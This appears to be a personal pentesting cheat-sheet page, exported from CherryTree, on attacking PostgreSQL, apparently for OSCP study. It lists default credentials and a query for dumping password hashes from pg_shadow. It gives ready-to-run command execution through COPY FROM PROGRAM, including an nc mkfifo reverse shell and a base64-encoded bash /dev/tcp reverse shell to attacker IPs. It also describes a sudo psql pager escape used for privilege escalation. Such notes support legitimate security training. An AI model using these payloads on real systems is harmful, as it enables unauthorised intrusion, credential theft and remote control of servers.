<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PostgreSQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PostgreSQL</h1><br/><p><h1>Background</h1></p><p>[OSCP 69-72]</p><p>Uses port <strong>5432</strong> by def, but if that&#39;s taken, it&#39;ll use next available port (e.g 5437)</p><p></p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql">hacktricks</a> for RCE, PrivEsc, etc</p><p></p><p><h2>Default Credentials</h2></p><p>Def login is either <strong>postgres</strong>: or <strong>postgres</strong>:<strong>postgres</strong>. </p><p></p><p>See wordlists with more possible cred pairs by running-</p><p></p><p><em>find -L /usr/share/wordlists -iname &quot;*postgre*&quot; 2&gt;/dev/null</em></p><p></p><p><h1>Client Tool</h1></p><p>If the password prompt isn&#39;t appearing for some reason, use -W to force it to.</p><p><a href="https://tomcam.github.io/postgres/">Cheatsheet</a></p><p></p><p><span style="color:#f66151;text-decoration:underline;">IMPORTANT</span>: Sometimes you NEED to specify the database using <strong>-d</strong></p><p></p><p><em>psql -h 192.168.200.143 -p 5432 -U postgres</em></p><p></p><p><em>proxychains psql -h 172.17.0.2 -p 5432 -U silverpeas -d Silverpeas</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: You may have to specify localhost when accessing a local DB.</p><p></p><p><em>psql -U postgres -d webapp -h localhost</em></p><p></p><p><h2>Built-in Commands</h2></p><p><strong>help</strong>			General help menu</p><p></p><p><strong>\?</strong>			Help with psql commands</p><p></p><p><strong>\l</strong>				List Databases &amp; User Access Privileges</p><p></p><p><strong>\dt </strong>			List Tables</p><p></p><p><strong>\d+</strong> 			View Columns of a Table (More info than just <strong>\d</strong>)</p><p></p><p><strong>\du</strong>			Get User Roles</p><p></p><p><strong>\du+	</strong>		Get Privileges</p><p></p><p><strong>\q</strong>					Quit</p><p></p><p><h2>Switch Database</h2></p><p>To switch to the postgres DB, use the following command.</p><p></p><p><strong>\c  postgres</strong></p><p></p><p><h1>Check Version</h1></p><p><em>select version();</em></p><p></p><p><h1>Dump Hashes</h1></p><p>Postgres user hashes may be dumped with the following. This is the user&#39;s who can sign in to the DB, not the hashes stored in other tabes (e.g for a WebApp)</p><p></p><p><em>SELECT usename, passwd FROM pg_shadow;</em><em></em></p><p><em></em></p><p><h1>User Roles</h1></p><p>Check the <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#enumeration-of-privileges">roles and groups</a> to determine the privs that the user you&#39;re connected as has.</p><p></p><p><h1>RCE</h1></p><p>Depending on version &amp; the user&#39;s privs may be possible to get RCE on either Linux or Windows. See <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions">Hacktricks</a> (need to append <strong>;</strong> to some listed cmds).</p><p></p><p><a name="copy rce"></a><h2>Using Copy</h2></p><p>Since version 9.3, only <strong>superusers</strong> and member of the group  <strong>pg_execute_server_program</strong> can use this method. (Diff requirements in earlier ver? Any users?)</p><p></p><p><h3>Test</h3></p><p><em>DROP TABLE IF EXISTS cmd_exec;</em><em></em></p><p><em>CREATE TABLE cmd_exec(cmd_output text);</em><em></em></p><p><em>COPY cmd_exec FROM PROGRAM &#39;id&#39;;</em><em></em></p><p><em>SELECT * FROM cmd_exec;</em><em></em></p><p><em>DROP TABLE IF EXISTS cmd_exec;</em></p><p></p><p><span class="subheading">1-Liner</span></p><p>DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM &#39;ls -la /tmp&#39;; SELECT * FROM cmd_exec;</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Sometimes providing multiple arguments failed. Was able to use things like <strong>ls -la /tmp</strong>, but had to use 1 arg at a time for <strong>which</strong>.</p><p></p><p><em>DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM &#39;which bash&#39;; SELECT * FROM cmd_exec;</em><em></em></p><p><em></em></p><p>Works whereas the following didn&#39;t</p><p></p><p><em>DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM &#39;which bash nc&#39;; SELECT * FROM cmd_exec;</em><em></em></p><p><em></em></p><p><h3>Shell</h3></p><p>Can use other Reverse Shell payloads, but for ex-</p><p></p><p><em>DROP TABLE IF EXISTS cmd_exec;</em><em></em></p><p><em>CREATE TABLE cmd_exec(cmd_output text);</em><em></em></p><p><em>COPY cmd_exec FROM PROGRAM &#39;rm /tmp/sss;mkfifo /tmp/sss;cat /tmp/sss|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.217 9997 &gt;/tmp/sss&#39;;</em></p><p></p><p>OR</p><p></p><p><em>DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM &#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjEwLjI0OS85OTk5IDA+JjE=|base64 -d|bash&#39;;</em></p><p></p><p><h2>Abusing Pager</h2></p><p>Upon connecting with <em>psql</em>, may be able to abuse the functionality of the def pager used for <strong>\?</strong> (e.g <em>less</em>) to spawn a <a href="https://gtfobins.github.io/gtfobins/psql/">shell</a>. </p><p>Attempt this from a stabilized shell (ideally SSH, but python method could also work). </p><p></p><p>If you get a message like <strong>WARNING: terminal is not fully functional -  (press RETURN)</strong>, just hold down ENTER until you see the classic <strong>:</strong> from the pager (i.e <em>less</em>)</p><p><ol><li>Connect to DB as any User: <em>sudo psql -h localhost -U postgres webapp</em></li><li>Open Pager:<em> \?</em></li><li>Spawn Shell:<em> !/bin/sh</em>             (From the pager&#39;s <strong>:</strong> prompt)</li></ol></p><p></p><p><h3>Identity Crisis</h3><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span>The <span style="color:#ff0000;">shell is spawned as the user who executed </span><strong><span style="color:#ff0000;">psql</span></strong> in the first place, <span style="color:#ff0000;">not the user you signed into the postgres DB as</span>! Therefore, this is only a feasible means of <a href="PrivEsc_8.html">PrivEsc</a> if you can <span style="color:#ff0000;">run </span><strong><span style="color:#ff0000;">psql</span></strong><span style="color:#ff0000;"> as another user (e.g via sudo / SUID).</span></p><p>For example, if there&#39;s a user in<strong> /etc/passwd</strong> named <span style="color:#3584e4;">postgres</span>, but you used <span style="color:#3584e4;">www-data</span> to run <em>psql -h localhost -U postgres webapp</em>, then this method will only spawn another shell as <span style="color:#3584e4;">www-data</span>. </p><p></p><p><span class="subheading">Use Case</span>: This method worked when I spawned a “nc mkfifo shell” as the user postgres via the <a href="SQL--DBMS--PostgreSQL_40.html#copy rce">Copy RCE Method</a>. <em>sudo -l</em> showed <strong>(ALL) NOPASSWD: /usr/bin/psql</strong>. Therefore, I could run <em>sudo psql -h localhost -U postgres webapp</em></p><p></p><p><h1>Tips</h1></p><p>If done from a R shell, with a janky terminal, may get odd output with certain built-in cmds. This is like any other pager (i.e <em>less</em>) from a normal R Shell.</p><p></p><p>Hold Enter to keep outputting content, &amp; when youre done use<strong> q</strong> then Enter again.</p></div>
</body>
</html>
